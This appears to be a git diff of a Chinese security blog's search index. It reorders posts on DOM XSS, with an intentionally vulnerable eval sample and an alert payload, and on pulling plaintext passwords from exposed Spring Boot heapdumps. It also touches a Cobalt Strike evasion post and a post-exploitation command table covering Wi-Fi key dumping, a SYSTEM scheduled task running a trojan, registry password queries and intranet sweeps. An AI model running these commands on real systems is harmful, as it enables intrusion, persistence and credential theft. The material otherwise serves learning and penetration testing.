@@ -1,6 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>DOMXSS的一点研究</title>
+    <url>/2021/02/22/DOMXSS/</url>
+    <content><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？--通常domxss被称为“javascript中输出数据到HTML页面”，domxss的分类在我眼里一直是一个谜。</p>
+<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>domxss漏洞审计三步骤：漏洞的挖掘方式一般是从输入源或者输出点进行审计。通常我们是打开控制台，在console中对可以的关键函数进行输出，查看参数值是否可被控制，打断点进行调试。</p>
+<p>分析domxss的三大步骤：<br>输入源-编码-输出点<br>1.输入源(sources)：<br>location.href<br>lcoation.hash<br>location.search</p>
+<p>三个函数的作用域</p>
+<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139858968246.jpg" alt="-w773"></p>
+<p>2.编码：<br>js对文字进行编码涉及3个函数：escape,encodeURI,encodeURIComponent，相应3个解码函数：unescape,decodeURI,decodeURIComponent</p>
+<p>3.输出点(sinks)：<br>eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()<br>.innerHTML、.outerHTML<br>.append 等</p>
+<hr>
+<blockquote>
+<p>输入点：<br>document.location<br>document.URL<br>document.URLUnencoded<br>document.referrer<br>window.location（href hash）<br>所有的inputs<br>window.name<br>document.cookie<br>XMLhttpRequest<br>localstorage</p>
+</blockquote>
+<blockquote>
+<p>输出点：<br>document.write()<br>document.writeln()<br>xxx.innerHTML=<br>xxx.outerHTML=<br>innerHTML.replace=<br>document.attachEvent()<br>window.attachEvent()<br>document.location.replace()<br>document.location.assign()<br>document.domain<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p>
+</blockquote>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">关键函数列表</a></p>
+<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>将下述代码保存为domxss.html</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href=&quot;?name=1&quot; /&gt;</span><br><span class="line">    name 的值   </span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">    function GetRequest() &#123;</span><br><span class="line">        var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">        var theRequest = new Object();</span><br><span class="line">        if (url.indexOf(&quot;?&quot;) != -1) &#123;</span><br><span class="line">            var str = url.substr(1);</span><br><span class="line">            strs = str.split(&quot;&amp;&quot;);</span><br><span class="line">            for(var i = 0; i &lt; strs.length; i ++) &#123;</span><br><span class="line">                theRequest[strs[i].split(&quot;=&quot;)[0]]=decodeURI(strs[i].split(&quot;=&quot;)[1]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return theRequest;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //调用</span><br><span class="line">    var Request = new Object();</span><br><span class="line">    Request = GetRequest();</span><br><span class="line">    var name;</span><br><span class="line">    name = Request[&#x27;name&#x27;];</span><br><span class="line">    document.write(eval(name))  </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入domxss.html?name=javascript:alert(1) 成功弹框<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139813417431.jpg" alt="-w902"></p>
+<p>我们对关键代码进行分析：</p>
+<pre><code>var url = location.search
+var name;
+name = Request[&apos;name&apos;];
+document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然后重新赋值给新变量name，然后使用eval语句直接输出。eval函数可以直接执行javascript代码，所以我们输入name=javascript:alert(1)成功弹框。在上述代码中，输入源（sources）是location.search，输出点（sinks）是document.write。所以大家在做domxss漏洞挖掘的时候可以重点先关注“关键字”进行审计，如上述说的location.search等。<br>重点关键字表格如下：<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139826344907.jpg" alt="-w1368"><br><a href="https://github.com/fanyibo2009/work/blob/master/dom-xss%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0.xlsx">表格下载</a></p>
+<p>获取节点的主要方法<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139847616990.jpg" alt="-w631"></p>
+<p>关于漏洞修复可以看<a href="https://security.jd.com/#/safetyResearch/219">DOM-XSS漏洞挖掘</a>这部分</p>
+<p>最后大家可以关注一些浏览器特性，还有就是“通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多”</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM-based XSS</a><br><a href="https://security.jd.com/#/safetyResearch/219">DOM-XSS漏洞挖掘</a><br><a href="https://blog.th3wind.xyz/posts/1832779944.html">DOM XSS从javascript中输出数据到HTML页面</a><br><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">DOM-xss列表</a></p>
+]]></content>
+      <categories>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Cobalt Strike绕过流量审计</title>
     <url>/2020/09/23/CobaltStrike/</url>
     <content><![CDATA[<h1 id="Cobalt-Strike-绕过流量审计"><a href="#Cobalt-Strike-绕过流量审计" class="headerlink" title="Cobalt Strike 绕过流量审计"></a>Cobalt Strike 绕过流量审计</h1><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>Cobalt Strike is software for Adversary Simulations and Red Team Operations.<br>Cobalt Strike 简称CS， <a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">A-team详细介绍使用网址</a>。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。<br><strong>多人运动来不来</strong>？<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007629731936.jpg" alt="-w936"></p>
@@ -61,63 +100,21 @@ cs生成Windows exe，运行成功上线.可以看到14.17.67.46 东莞IP上线�
       </tags>
   </entry>
   <entry>
-    <title>DOMXSS的一点研究</title>
-    <url>/2021/02/22/DOMXSS/</url>
-    <content><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？--通常domxss被称为“javascript中输出数据到HTML页面”，domxss的分类在我眼里一直是一个谜。</p>
-<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>domxss漏洞审计三步骤：漏洞的挖掘方式一般是从输入源或者输出点进行审计。通常我们是打开控制台，在console中对可以的关键函数进行输出，查看参数值是否可被控制，打断点进行调试。</p>
-<p>分析domxss的三大步骤：<br>输入源-编码-输出点<br>1.输入源(sources)：<br>location.href<br>lcoation.hash<br>location.search</p>
-<p>三个函数的作用域</p>
-<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139858968246.jpg" alt="-w773"></p>
-<p>2.编码：<br>js对文字进行编码涉及3个函数：escape,encodeURI,encodeURIComponent，相应3个解码函数：unescape,decodeURI,decodeURIComponent</p>
-<p>3.输出点(sinks)：<br>eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()<br>.innerHTML、.outerHTML<br>.append 等</p>
-<hr>
-<blockquote>
-<p>输入点：<br>document.location<br>document.URL<br>document.URLUnencoded<br>document.referrer<br>window.location（href hash）<br>所有的inputs<br>window.name<br>document.cookie<br>XMLhttpRequest<br>localstorage</p>
-</blockquote>
-<blockquote>
-<p>输出点：<br>document.write()<br>document.writeln()<br>xxx.innerHTML=<br>xxx.outerHTML=<br>innerHTML.replace=<br>document.attachEvent()<br>window.attachEvent()<br>document.location.replace()<br>document.location.assign()<br>document.domain<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p>
-</blockquote>
-<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">关键函数列表</a></p>
-<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>将下述代码保存为domxss.html</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href=&quot;?name=1&quot; /&gt;</span><br><span class="line">    name 的值   </span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">    function GetRequest() &#123;</span><br><span class="line">        var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">        var theRequest = new Object();</span><br><span class="line">        if (url.indexOf(&quot;?&quot;) != -1) &#123;</span><br><span class="line">            var str = url.substr(1);</span><br><span class="line">            strs = str.split(&quot;&amp;&quot;);</span><br><span class="line">            for(var i = 0; i &lt; strs.length; i ++) &#123;</span><br><span class="line">                theRequest[strs[i].split(&quot;=&quot;)[0]]=decodeURI(strs[i].split(&quot;=&quot;)[1]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return theRequest;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //调用</span><br><span class="line">    var Request = new Object();</span><br><span class="line">    Request = GetRequest();</span><br><span class="line">    var name;</span><br><span class="line">    name = Request[&#x27;name&#x27;];</span><br><span class="line">    document.write(eval(name))  </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>输入domxss.html?name=javascript:alert(1) 成功弹框<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139813417431.jpg" alt="-w902"></p>
-<p>我们对关键代码进行分析：</p>
-<pre><code>var url = location.search
-var name;
-name = Request[&apos;name&apos;];
-document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然后重新赋值给新变量name，然后使用eval语句直接输出。eval函数可以直接执行javascript代码，所以我们输入name=javascript:alert(1)成功弹框。在上述代码中，输入源（sources）是location.search，输出点（sinks）是document.write。所以大家在做domxss漏洞挖掘的时候可以重点先关注“关键字”进行审计，如上述说的location.search等。<br>重点关键字表格如下：<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139826344907.jpg" alt="-w1368"><br><a href="https://github.com/fanyibo2009/work/blob/master/dom-xss%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0.xlsx">表格下载</a></p>
-<p>获取节点的主要方法<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139847616990.jpg" alt="-w631"></p>
-<p>关于漏洞修复可以看<a href="https://security.jd.com/#/safetyResearch/219">DOM-XSS漏洞挖掘</a>这部分</p>
-<p>最后大家可以关注一些浏览器特性，还有就是“通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多”</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM-based XSS</a><br><a href="https://security.jd.com/#/safetyResearch/219">DOM-XSS漏洞挖掘</a><br><a href="https://blog.th3wind.xyz/posts/1832779944.html">DOM XSS从javascript中输出数据到HTML页面</a><br><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">DOM-xss列表</a></p>
+    <title>批量反编译class</title>
+    <url>/2017/05/26/fanbianiyi/</url>
+    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar">fernflower.jar</a> 批量反编译class</strong></p>
+<p><strong>批量反编译</strong></p>
+<ul>
+<li>首先把工程的所有class压缩成classes.zip</li>
+<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
+</ul>
 ]]></content>
       <categories>
-        <category>xss</category>
+        <category>反编译</category>
       </categories>
       <tags>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MAT 查找 spring heapdump 中的密码明文</title>
-    <url>/2020/08/25/SpringBootHeapdump/</url>
-    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
-<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
-<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
-<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
-<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
-<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>
-]]></content>
-      <categories>
-        <category>代码</category>
-      </categories>
-      <tags>
-        <tag>黑盒测试</tag>
+        <tag>java反编译工具</tag>
+        <tag>fernflower.jar</tag>
       </tags>
   </entry>
   <entry>
@@ -149,21 +146,24 @@ document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然�
       </tags>
   </entry>
   <entry>
-    <title>批量反编译class</title>
-    <url>/2017/05/26/fanbianiyi/</url>
-    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar">fernflower.jar</a> 批量反编译class</strong></p>
-<p><strong>批量反编译</strong></p>
-<ul>
-<li>首先把工程的所有class压缩成classes.zip</li>
-<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
-</ul>
+    <title>MAT 查找 spring heapdump 中的密码明文</title>
+    <url>/2020/08/25/SpringBootHeapdump/</url>
+    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
+<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
+<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
+<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
+<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>
 ]]></content>
       <categories>
-        <category>反编译</category>
+        <category>代码</category>
       </categories>
       <tags>
-        <tag>java反编译工具</tag>
-        <tag>fernflower.jar</tag>
+        <tag>黑盒测试</tag>
       </tags>
   </entry>
   <entry>
@@ -738,11 +738,11 @@ web.xml
 <td>识别开机启动的程序</td>
 </tr>
 <tr>
-<td align="left">wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</td>
+<td align="left">wmic process where(description=&quot;mysqld.exe&quot;)&gt;&gt;mysql.log</td>
 <td>获取软件安装路径</td>
 </tr>
 <tr>
-<td align="left">for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan showprofiles’) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td>
+<td align="left">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan showprofiles&#39;) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td>
 <td>一键获取wifi密码</td>
 </tr>
 <tr>
@@ -754,18 +754,18 @@ web.xml
 <td>查看登录情况</td>
 </tr>
 <tr>
-<td align="left">schtasks.exe /Create /RU”SYSTEM” /SC MINUTE /MO 45 /TN FIREWALL /TR “c:/muma.ex  e” /ED 2017/4/7</td>
+<td align="left">schtasks.exe /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.exe&quot; /ED 2017/4/7</td>
 <td>添加计划任务</td>
 </tr>
 <tr>
-<td align="left">REG query HKCU /v “pwd” /s</td>
+<td align="left">REG query HKCU /v  &quot;pwd&quot; /s</td>
 <td>获取保存到注册表中的密码</td>
 </tr>
 </tbody></table>
 <h3 id="提权补丁"><a href="#提权补丁" class="headerlink" title="提权补丁"></a>提权补丁</h3><table>
 <thead>
 <tr>
-<th>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i “%i”||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</th>
+<th>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</th>
 <th>windows未打补丁情况</th>
 </tr>
 </thead>
@@ -810,7 +810,7 @@ web.xml
 <td>查看防火墙策略</td>
 </tr>
 <tr>
-<td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i”ttl”</td>
+<td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</td>
 <td>批量扫描内网存活主机</td>
 </tr>
 </tbody></table>
@@ -938,7 +938,7 @@ web.xml
 <td>远程主机上无需管理员权限,查询到主机名和用户</td>
 </tr>
 <tr>
-<td>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td>
+<td>reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT&quot;</td>
 <td>获取最近mstsc登录的记录</td>
 </tr>
 </tbody></table>
